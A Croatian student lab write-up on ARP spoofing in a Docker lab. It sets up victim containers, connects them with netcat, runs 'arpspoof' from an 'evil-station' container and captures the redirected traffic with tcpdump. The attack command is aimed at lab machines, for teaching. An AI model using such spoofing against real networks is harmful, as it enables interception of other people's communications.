# 1. Laboratorijska vjezba(Man-In-The-Middle)

**Zadatak**

Realizirati *man in the middle* napad iskorištavanjem ranjivosti ARP protokola. 

Student će testirati napad u virtualiziranoj Doker mreži koju čine 3 virtualizirana Docker računala (eng. *container*): dvije *žrtve* `station-1` i `station-2` te napadač `evil-station`.

U ovo vježbi realiziramo napad ARP spoofing tako što narušimo integritet neke  žrtve (**station-1** ili **station-2**).

![Untitled](1%20Laboratorijska%20vjezba(Man-In-The-Middle)%20b3389a9fc1d7433e9279baebfded3427/Untitled.png)

**Kreiranje okruženja**

1.Korak kloniranje:

```bash
$ git clone https://github.com/mcagalj/SRP-2021-22
```

2.Korak mijenjanje repozitorija:

```bash
$ cd SRP-2021-22/arp-spoofing
```

3.Korak running bash script:

```bash
$ ./start.sh
$ ./stop.sh
```

**Lista kontenjera**

```bash
$ docker ps
```

![Untitled](1%20Laboratorijska%20vjezba(Man-In-The-Middle)%20b3389a9fc1d7433e9279baebfded3427/Untitled%201.png)

**Aktivacija dockera**

```bash
$ docker exec -it "Station name" bash
```

![Untitled](1%20Laboratorijska%20vjezba(Man-In-The-Middle)%20b3389a9fc1d7433e9279baebfded3427/Untitled%202.png)

![Untitled](1%20Laboratorijska%20vjezba(Man-In-The-Middle)%20b3389a9fc1d7433e9279baebfded3427/Untitled%203.png)

![Untitled](1%20Laboratorijska%20vjezba(Man-In-The-Middle)%20b3389a9fc1d7433e9279baebfded3427/Untitled%204.png)

**Spajanje**

```bash
$ netcat -lp 8000
potom
$ netcat station-2 8000
```

![Untitled](1%20Laboratorijska%20vjezba(Man-In-The-Middle)%20b3389a9fc1d7433e9279baebfded3427/Untitled%205.png)

**NAPAD**

```bash
$ arpspoof -t station-1 station-2
```

![Untitled](1%20Laboratorijska%20vjezba(Man-In-The-Middle)%20b3389a9fc1d7433e9279baebfded3427/Untitled%206.png)

```bash
 $ tcpdump-izvrsenje napada
```

![Untitled](1%20Laboratorijska%20vjezba(Man-In-The-Middle)%20b3389a9fc1d7433e9279baebfded3427/Untitled%207.png)